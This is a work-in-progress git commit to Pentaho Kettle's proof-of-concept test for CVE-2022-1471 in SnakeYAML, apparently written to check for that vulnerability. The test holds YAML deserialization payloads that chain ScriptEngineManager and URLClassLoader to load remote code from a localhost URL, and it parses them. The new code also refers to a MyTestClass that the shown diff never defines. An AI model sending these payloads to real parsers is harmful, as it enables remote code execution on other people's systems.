fce4d73e145943d34ad02ea1e800c91894426284
Nicholas Jordan <nicholas.jordan@hitachivantara.com>
2024-08-16 17:37:47 -0400

    wip, changes might not be correct

--- engine/src/test/java/org/pentaho/di/snakeyaml/PocSnakeYamlCveTest.java
+++ engine/src/test/java/org/pentaho/di/snakeyaml/PocSnakeYamlCveTest.java
@@ -1,10 +1,12 @@
 package org.pentaho.di.snakeyaml;
 
 import org.junit.Test;
+import org.yaml.snakeyaml.LoaderOptions;
 import org.yaml.snakeyaml.Yaml;
 import org.yaml.snakeyaml.constructor.Constructor;
 
 import java.io.ByteArrayInputStream;
+import java.io.FileInputStream;
 import java.io.InputStream;
 import java.util.Map;
 
@@ -13,20 +15,48 @@ import java.util.Map;
  */
 public class PocSnakeYamlCveTest {
 
-  final String attackVecctor = "!!javax.script.ScriptEngineManager [  \n"
+  final String attackVecctor = "some_var: !!javax.script.ScriptEngineManager [  \n"
     + "     !!java.net.URLClassLoader [[  \n"
     + "          !!java.net.URL [\"http://localhost:8080/\"]  \n"
     + "     ]]  \n"
     + "] ";
 
+  final String attackVecctor2 = "!!MyTestClass\n"
+    + "stringField: \"hi\"\n"
+    + "objectField: !!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL [\"http://localhost:8000/\"]]]]";
+
+  final String absolutePathAttackVector = "/Users/njordan/code_sandbox/pentaho/repo/pentaho-kettle/engine/src/test/java/org/pentaho/di/snakeyaml/exploit.yaml";
   public static class Test1 {
-    public String some_var = "abe";
+    public String some_var = "abc";
+  }
+  public static class MySerialClass {
+    private long id;
+    public Object objectField;
+    public String stringField;
+
+    public  MySerialClass() {
+    }
+
+    public MySerialClass(long id, Object test) {
+      this.id = id;
+      this.objectField = test;
+      this.stringField = test.toString();
+    }
+
+    public String toString() {
+      return id + " " + stringField.toString();
+    }
   }
 
   @Test
   public void exploit_cve_2022_1471_Test() throws Exception {
-    InputStream is = new ByteArrayInputStream( attackVecctor.getBytes() );
-    Yaml yaml = new Yaml( new Constructor( Test1.class ) );
-    Map<String, Object> obj = yaml.load( is );
+    System.out.println("Start parsing...");
+    InputStream is = new ByteArrayInputStream( attackVecctor2.getBytes() );
+//    InputStream is = new FileInputStream(absolutePathAttackVector);
+//    Yaml yaml = new Yaml( new Constructor( MySerialClass.class ) ); // for snakeyaml v1.33 and below
+    Yaml yaml = new Yaml( new Constructor( MyTestClass.class, new LoaderOptions() ) ); // for snakeyaml v2.0+
+    yaml.load( is ); // not caring about result
+
+    System.out.println("End parsing.");
   }
 }
